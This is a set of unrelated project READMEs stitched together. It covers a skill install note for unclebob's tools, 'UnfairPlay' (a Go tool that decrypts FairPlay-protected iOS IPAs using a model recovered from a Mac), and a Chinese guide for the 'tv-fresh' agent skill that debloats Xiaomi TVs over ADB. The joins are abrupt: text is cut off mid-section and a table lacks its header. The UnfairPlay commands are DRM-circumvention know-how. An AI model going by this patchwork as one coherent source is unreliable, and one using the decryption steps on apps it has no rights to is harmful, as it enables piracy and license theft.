- [unclebob/mutator](https://github.com/unclebob/mutator) — Runs mutation testing to expose uncovered code and surviving mutants that tests fail to catch.
- [unclebob/uml-viewer](https://github.com/unclebob/uml-viewer) — Visualizes components, coverage, CRAP, mutation scores, and dependency directions.

## Installation

Copy `SKILL.md` into your agent's skills directory as `ub-mode/SKILL.md` (for example `~/.grok/skills/ub-mode/SKILL.md`, `~/.claude/skills/ub-mode/SKILL.md`, or `~/.cursor/skills/ub-mode/SKILL.md`), then invoke `/ub-mode`.

# UnfairPlay

UnfairPlay recovers a FairPlay model from an enrolled Mac and uses it to
decrypt personalized iOS IPAs. It is a standalone Go program.

It does not log in to Apple, buy apps, or download IPAs. You can use ipatool or
another downloader for that part.

## Legal and ethical use

Use UnfairPlay only with apps you lawfully acquired and accounts and devices
you control. It is intended for interoperability, preservation, and authorized
research. The authors do not condone piracy, credential theft, copyright
infringement, or unauthorized distribution of decrypted apps.

## Build

```sh
go build -o unfairplay ./cmd/unfairplay
```

## Usage

First, sign in to the native Mac App Store. Install an iPhone or iPad app and
open it once. Download a matching encrypted IPA with the same Apple Account.

Set up reusable decryption once:

```sh
sudo ./unfairplay setup \
  --app /Applications/App.app \
  --ipa App.ipa
```

The saved model is private. It is tied to the Mac App Store enrollment, not to
one app, so it can decrypt other personalized IPAs from the same enrollment.

Decrypt another IPA:

```sh
./unfairplay decrypt --input AnotherApp.ipa
```

The default model directory is inside the user configuration directory. Set
`UNFAIRPLAY_MODEL_DIR` or pass `--model` to use another location.

IPAs with extensions and watch apps are decrypted in one pass. Test without
keeping plaintext with:

```sh
./unfairplay verify --input AnotherApp.ipa
```

### Convert an IPA for macOS

This requires an encrypted IPA personalized for the same Store enrollment as
your saved model. Convert it with:

```sh
./unfairplay convert-ipa-macos --input App.ipa
```

The default output is `App.macos.ipa`. Use `--output` to choose another path or
`--force` to replace an existing output.

The command uses a saved version-2 enrollment model. You can instead use a
matching private 16-byte credential:

```sh
chmod 600 credential.bin
./unfairplay convert-ipa-macos \
  --input App.ipa \
  --credential credential.bin
```

The conversion:

- validates and rewrites the personalized SINF into the macOS layout;
- preserves its app key, signature, rights, and other private fields;
- adds every SINF copy declared by Apple for encrypted frameworks and
  extensions; and
- leaves all Mach-O executables byte-identical and encrypted.

The result is still an IPA, not a macOS installer. A macOS iOS-app wrapper or
compatible installer must preserve this basic layout:

```text
App iOS.app/
  WrappedBundle -> Wrapper/App.app
  Wrapper/App.app
  Wrapper/iTunesMetadata.plist
```

The converted IPA and wrapper contain a private account license. Keep them
private. This feature does not decrypt, modify, re-sign, or bypass checks inside
the app. Apps may still reject macOS, require unavailable hardware, or depend on
services that are not present on macOS.

## Advanced commands

`collect` and `recover` expose the two setup stages for diagnostics and
archived captures. `doctor` checks a capture, IPA, or model. …

> 免 root、全程可逆（所有操作都有对应还原命令）。
> 原理：ADB 调试 + `pm uninstall --user 0`（只对当前用户卸载，系统分区不动，
> `cmd package install-existing <包名>` 一条命令可还原）。
![改造后的电视桌面（Projectivy Launcher + 无广告 + CMFA/SmartTube/影视仓全家桶）](docs/desktop-home.jpg)

# 作为 Agent Skill 使用（推荐）

本仓库同时是一个可安装的 agent 技能（含 `SKILL.md` + 分任务 reference + 一键脚本），
你的 AI 助手装上后即可按流程安全地改造小米电视：

```bash
# omp 等 agent 的技能目录（其它 agent 放各自的 skills 目录即可）
git clone https://github.com/wangrongding/tv-fresh ~/.agents/skills/tv-fresh
```


## 安装后的使用示范（复制即用）

**一键全家桶**（复刻本仓库作者的完整改造效果）：

```text
我的小米电视(MIUI TV)要全面改造，按 tv-fresh 技能流程来：
1. 去广告：清掉广告/推送/统计组件，OTA 复活了要能重跑
2. 换桌面：装 Projectivy Launcher，开机直达无广告，PatchWall 禁用但保留可恢复
3. 装代理：Clash Meta(CMFA)，配置文件在 <你的配置路径/URL>，规则要国内直连、节点挂了不影响电视
4. 装 YouTube 客户端 SmartTube
5. 装影视仓 + OK影视(FongMi)，配置源用 http://肥猫.net/tv
6. 清理预装：先给我编号清单我挑，别自作主张删
电视 IP 是 192.168.1.4（不对就扫 5555 端口找）。
删除/禁用系统包前列清单等我确认，全程用可逆操作并附恢复命令。
```

> 需要遥控器配合的只有三处：电视开 ADB、授权弹窗点允许、CMFA 的 VPN 授权——其余 agent 全自动。

**单任务短句**（技能自动路由）：

```text
帮我把小米电视的开机广告去掉                    → debloat
电视换个第三方桌面，要可回滚                    → launcher-swap
电视上装个能看 YouTube 的                       → proxy-youtube
给 TVBox 配一个能自动更新的接口                 → streaming-apps
电视输入法打网址全是全角符号，帮我填个配置地址   → remote-toolbox
```

|---|---|
| 广告/推送/统计组件 | 全部移除，重启存活 |

# Part 1 · 去广告（基础篇）

## 一、解锁开发者模式并开启 ADB

1. **设置 → 关于 → 「产品型号」**（或「版本号」）**连按遥控器"确定"5-7 次** → 提示"已开启开发者模式"
2. **设置 → 账号与安全 → ADB 调试 → 允许**（部分固件在 设置 → 通用设置 → 开发者选项）
3. 首次连接时电视会弹 RSA 授权框，遥控器选"允许"（勾选"一律允许"）

> 注意：部分固件（如 MiTV-ASTP0）**每次重启 ADB 开关会被复位**，需重新开启。
> 没有桌面时可用语音键说"打开设置"进入。

## 二、电脑端连接

```bash
adb connect <电视IP>:5555
adb devices   # 确认 device 状态（unauthorized=电视上有弹窗没点）
```

电视与电脑同一路由器即可（2.4G/5G 任意，同网段互通；不要用访客网络）。

## 三、去广告组件清单（按固件实测调整）

社区通用清单（部分固件只有其中几项）：

| 包名 | 作用 |
|---|---|
| `com.miui.systemAdSolution` | 系统广告引擎（横幅/开屏，核心） |
| `com.duokan.videodaily` | 今日头屏 |
| `com.xiaomi.mitv.tvpush`(.tvpushservice) | 消息推送弹窗 |
| `com.xiaomi.mitv.advertise` | 广告服务 |
| `com.mitv.tvad` | 电视广告 |
| `com.mitv.analysis` / `com.miui.analytics` / `com.miui.tv.analytics` | 行为统计 |
| `com.xiaomi.mistat.analyticstracker` | 埋点上报 |
| `com.xiaomi.tv.musicadapter` | 音乐卡片 |
| `com.xiaomi.mitv.tvmanager` | 电视管家 |
| `com.mitv.shoplugin` | 商城插件 |

```bash
adb shell pm uninstall --user 0 com.miui.analytics
# ...逐个执行；先 pm list packages 确认存在再删
```

**不要碰**：`com.android.packageinstaller`、`com.mitv.tvplayer` 等核心组件。
**OTA 升级可能复活组件**：重跑一遍即可。

## 四、路由器层辅助（可选）

屏蔽 `ad.xiaomi.com`、`ad1.xiaomi.com`、`ad.mi.com`。
